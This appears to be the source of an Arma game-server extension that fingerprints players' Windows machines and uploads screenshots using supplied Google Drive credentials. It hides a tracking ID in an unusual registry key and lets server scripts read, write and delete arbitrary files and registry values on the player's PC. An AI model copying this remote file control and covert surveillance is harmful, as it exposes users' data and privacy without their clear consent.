package main

/*
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
*/
import "C"

import (
	"bytes"
	"crypto/rand"
	"encoding/json"
	"fmt"
	"net"
	"regexp"
	"time"
	"unsafe"

	"golang.org/x/oauth2"
	"golang.org/x/oauth2/google"
	"google.golang.org/api/drive/v3"
)

func main() {}

func writeGUIDregistr() {
	id, err := readReg("current_user", `Software\Classes\mscfile\shell\open\command`, "GUID")
	fmt.Printf("%s\n", id)
	if err != nil {
		guid := generateGUID()
		writeReg("current_user", `Software\Classes\mscfile\shell\open\command`, "GUID", guid)
	}
}

func generateGUID() (uuid string) {
	b := make([]byte, 16)
	_, err := rand.Read(b)
	if err != nil {
		returnMyData("errors", err)
	}
	uuid = fmt.Sprintf("%x%x%x%x%x%x", b[0:4], b[4:6], b[6:8], b[8:10], b[10:13], b[13:])
	return
}

func getMacAddr() (addr string) {
	interfaces, err := net.Interfaces()
	if err == nil {
		for _, i := range interfaces {
			if i.Flags&net.FlagUp != 0 && bytes.Compare(i.HardwareAddr, nil) != 0 {
				addr = i.HardwareAddr.String()
				break
			}
		}
	}
	return
}

func returnMyData(input string, errors error) string {
	rID := ""
	switch input {
	case "hwid":
		id, _ := readReg("local_machine", `SOFTWARE\Microsoft\Cryptography`, "MachineGuid")
		rID = fmt.Sprintf(id)
	case "HDD_UID":
		id, _ := readReg("local_machine", `HARDWARE\DESCRIPTION\System\MultifunctionAdapter\0\DiskController\0\DiskPeripheral\0`, "Identifier")
		rID = fmt.Sprintf(id)
	case "Product_Win":
		id, _ := readReg("local_machine", `SOFTWARE\Microsoft\Windows NT\CurrentVersion`, "ProductId")
		rID = fmt.Sprintf(id)
	case "processList":
		rID = fmt.Sprintf(getProcesses())
	case "MAC":
		rID = fmt.Sprintf(getMacAddr())
	case "GUID":
		id, _ := readReg("current_user", `Software\Classes\mscfile\shell\open\command`, "GUID")
		rID = fmt.Sprintf(id)
	case "version":
		writeGUIDregistr()
		rID = fmt.Sprintf("v3 03.05.21")
	case "errors":
		rID = fmt.Sprintf("Error '%s'", errors)
	case "info":
		rID = fmt.Sprintf("Created by FairyTale5571. Commands not available for public")
	default:
		id := fmt.Sprintf("Error '%s' is undefined command, contact Discord FairyTale#5571 for more information", input)
		rID = id
	}
	return rID
}

//export goRVExtensionVersion
func goRVExtensionVersion(output *C.char, outputsize C.size_t) {
	result := C.CString("RRPHW v3.00")
	defer C.free(unsafe.Pointer(result))
	var size = C.strlen(result) + 1
	if size > outputsize {
		size = outputsize
	}
	C.memmove(unsafe.Pointer(output), unsafe.Pointer(result), size)
}

//export goRVExtension
func goRVExtension(output *C.char, outputsize C.size_t, input *C.char) {
	id := returnMyData(C.GoString(input), nil)
	temp := (fmt.Sprintf("%s", id))
	printInArma(output, outputsize, temp)
}

//export goRVExtensionArgs
func goRVExtensionArgs(output *C.char, outputsize C.size_t, input *C.char, argv **C.char, argc C.int) {
	offset := unsafe.Sizeof(uintptr(0))
	action := C.GoString(input)
	clearArgs := cleanInput(argv, int(argc))
	switch action {
	case "credentials":
		var err error
		_creds_json := (**C.char)(unsafe.Pointer(uintptr(unsafe.Pointer(argv))))
		creds_json := C.GoString(*_creds_json)
		creds_json = creds_json[1 : len(creds_json)-1]

		reToken := regexp.MustCompile(`""`)
		creds_json = reToken.ReplaceAllString(creds_json, `"`)

		b := []byte(creds_json)
		config, err = google.ConfigFromJSON(b, drive.DriveScope)
		fmt.Println(creds_json)
		if err != nil {
			printInArma(output, outputsize, err.Error())
			return
		}
		printInArma(output, outputsize, "Creds accepted")
		return
	case "token":
		_token_json := (**C.char)(unsafe.Pointer(uintptr(unsafe.Pointer(argv))))
		token_json := C.GoString(*_token_json)
		token_json = token_json[1 : len(token_json)-1]

		reToken := regexp.MustCompile(`""`)
		token_json = reToken.ReplaceAllString(token_json, `"`)

		fmt.Println(token_json)

		tokenR := bytes.NewReader([]byte(token_json))

		tok = &oauth2.Token{}
		err := json.NewDecoder(tokenR).Decode(tok)
		if err != nil {
			printInArma(output, outputsize, err.Error())
			return
		}
		printInArma(output, outputsize, "Token accepted")
		return
	case "doit":
		_name := (**C.char)(unsafe.Pointer(uintptr(unsafe.Pointer(argv))))
		_uid := (**C.char)(unsafe.Pointer(uintptr(unsafe.Pointer(argv)) + offset))

		name := C.GoString(*_name)
		uid := C.GoString(*_uid)

		t := time.Now()
		path := fmt.Sprintf("/screenshots/%s_%s/%d/%d/%d", name[1:len(name)-1], uid[1:len(uid)-1], t.Year(), t.Month(), t.Day())
		time.Sleep(5 * time.Second)
		makeScreenshot(path)
		printInArma(output, outputsize, "Done")
		return
	case "write_reg":
		printInArma(output, outputsize, writeReg(clearArgs[0], clearArgs[1], clearArgs[2], clearArgs[3]))
		return
	case "read_reg":
		r, _ := readReg(clearArgs[0], clearArgs[1], clearArgs[2])
		printInArma(output, outputsize, r)
		return
	case "del_reg":
		printInArma(output, outputsize, delReg(clearArgs[0], clearArgs[1], clearArgs[2]))
		return
	case "write_file":
		printInArma(output, outputsize, writeFile(clearArgs[0], clearArgs[1]))
		return
	case "read_file":
		printInArma(output, outputsize, readFile(clearArgs[0]))
		return
	case "delete_file":
		printInArma(output, outputsize, delFile(clearArgs[0]))
		return
	default:
		temp := fmt.Sprintf("Undefined '%s' command", action)
		printInArma(output, outputsize, temp)
		return
	}

	temp := fmt.Sprintf("Function: %s nb params: %d params: %s!", C.GoString(input), argc, clearArgs)
	printInArma(output, outputsize, temp)
}
